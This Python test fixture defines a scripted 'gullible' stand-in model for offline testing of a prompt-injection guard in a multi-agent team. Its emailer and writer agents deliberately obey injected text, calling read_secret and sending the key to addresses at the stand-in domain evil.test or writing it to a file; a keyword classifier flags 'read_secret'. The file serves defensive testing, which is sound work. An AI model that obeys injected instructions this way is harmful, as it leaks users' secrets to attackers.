"""
A scripted stand-in for the LLM, so whole runs can be tested offline with no API calls.

It plays a gullible team: workers follow any instruction they can see, including injected ones.
That way the tests show what the guard stops, not what the model happens to refuse. It only
sees what the guard lets through (the hooks' llm_input_messages), so a quarantined injection
is invisible to it, but a wrapped one is still followed.
"""
import itertools
import re

from langchain_core.language_models.chat_models import BaseChatModel
from langchain_core.messages import AIMessage, ToolMessage
from langchain_core.outputs import ChatGeneration, ChatResult

from ours.integration.team import DEFAULT_PROMPTS

EMAIL = re.compile(r"[\w.+-]+@[\w-]+(?:\.[\w-]+)+")   # no trailing full stop
FILE = re.compile(r"\b[\w-]+\.txt\b")
_ids = itertools.count()


def _text(m) -> str:
    return m.content if isinstance(m.content, str) else str(m.content)


class GullibleTeamModel(BaseChatModel):
    @property
    def _llm_type(self) -> str:
        return "gullible-team"

    def bind_tools(self, tools, **kwargs):
        return self

    def _generate(self, messages, stop=None, run_manager=None, **kwargs):
        system, rest = _text(messages[0]), messages[1:]
        agent = next((name for name, prompt in DEFAULT_PROMPTS.items() if system.startswith(prompt)), "supervisor")
        reply = getattr(self, f"_{agent}")(rest)
        reply.usage_metadata = {"input_tokens": sum(len(_text(m)) for m in messages) // 4,
                                "output_tokens": 10, "total_tokens": 0}
        return ChatResult(generations=[ChatGeneration(message=reply)])

    # ------------------------------------------------------------------ helpers

    @staticmethod
    def _call(tool, **args):
        return AIMessage(content="", tool_calls=[{"name": tool, "args": args, "id": f"call_{next(_ids)}"}])

    @staticmethod
    def _task(messages) -> str:
        return _text(messages[0])

    @staticmethod
    def _results(messages, tool):
        return [_text(m) for m in messages if isinstance(m, ToolMessage) and m.name == tool]

    @staticmethod
    def _visible(messages) -> str:
        return "\n".join(_text(m) for m in messages[1:])

    # ------------------------------------------------------------------ agents

    def _supervisor(self, messages):
        task = self._task(messages)
        done = {c["name"] for m in messages if isinstance(m, AIMessage) for c in m.tool_calls}
        if "transfer_to_reader" not in done:
            return self._call("transfer_to_reader")
        if "email" in task and "transfer_to_emailer" not in done:
            return self._call("transfer_to_emailer")
        if "save" in task and "transfer_to_writer" not in done:
            return self._call("transfer_to_writer")
        return AIMessage(content="All done.")

    def _reader(self, messages):
        docs = self._results(messages, "read_document")
        if not docs:
            return self._call("read_document", name=FILE.search(self._task(messages)).group())
        return AIMessage(content=f"Summary of the document: {docs[-1]}")

    def _secret_if_asked(self, messages):
        """Follow an injected request for the secret, if one is visible. Returns (call or None, secret)."""
        secrets = self._results(messages, "read_secret")
        if "read_secret" in self._visible(messages) and not secrets:
            return self._call("read_secret"), None
        secret = secrets[-1] if secrets and not secrets[-1].startswith("BLOCKED") else None
        return None, secret

    def _emailer(self, messages):
        call, secret = self._secret_if_asked(messages)
        if call:
            return call
        task, sent = self._task(messages), {}
        for m in messages:
            if isinstance(m, AIMessage):
                for c in m.tool_calls:
                    if c["name"] == "send_email":
                        sent[c["args"]["to"]] = True
        recipient = EMAIL.search(task).group()
        targets = [recipient] + [a for a in EMAIL.findall(self._visible(messages)) if a.endswith("evil.test")]
        for to in targets:
            if to not in sent:
                body = "Here is the summary." + (f" Key: {secret}" if secret else "")
                return self._call("send_email", to=to, body=body)
        return AIMessage(content="Emails sent.")

    def _writer(self, messages):
        call, secret = self._secret_if_asked(messages)
        if call:
            return call
        if not self._results(messages, "write_file"):
            path = FILE.findall(self._task(messages))[-1]
            return self._call("write_file", path=path, content="Summary." + (f" Key: {secret}" if secret else ""))
        return AIMessage(content="File saved.")

    def _secrets_manager(self, messages):
        return AIMessage(content="Nothing to do.")


class KeywordClassifier:
    """Offline stand-in for LLMClassifier: flags text that mentions read_secret."""

    def __init__(self):
        self.calls = []

    def classify(self, text: str) -> bool:
        flagged = "read_secret" in text
        self.calls.append({"flagged": flagged, "input_tokens": 0, "output_tokens": 0})
        return flagged
